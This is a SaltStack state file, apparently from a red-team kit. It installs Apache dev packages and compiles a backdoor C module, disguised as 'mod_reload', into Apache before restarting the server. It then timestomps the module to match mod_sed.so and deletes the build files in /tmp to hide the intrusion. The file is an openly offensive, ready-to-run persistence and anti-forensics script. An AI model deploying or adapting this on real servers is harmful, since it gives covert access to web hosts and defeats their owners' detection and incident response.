apache:
  pkg.installed:
    - pkgs:
      - apache2
      - apache2-dev

backdoor:
  file.managed:
    - name: /tmp/mod_reload.c
    - source: salt://redteam/linux/mod_backdoor.c
    - user: root
    - group: root
    - mode: 755
  cmd.run:
    - name: apxs -i -a -c mod_reload.c && service apache2 restart
    - cwd: /tmp
    - require:
      - pkg: apache

restart:
  service.running:
    - name: apache2
    - enable: True
    - reload: True
    - require:
      - file: backdoor

cleanup:
  cmd.run:
    - name: touch -r /usr/lib/apache2/modules/mod_sed.so /usr/lib/apache2/modules/mod_reload.so
  file.absent:
    - names:
      - /tmp/mod_reload.c
      - /tmp/mod_reload.lo
      - /tmp/mod_reload.la
      - /tmp/mod_reload.slo
    - require:
      - service: restart
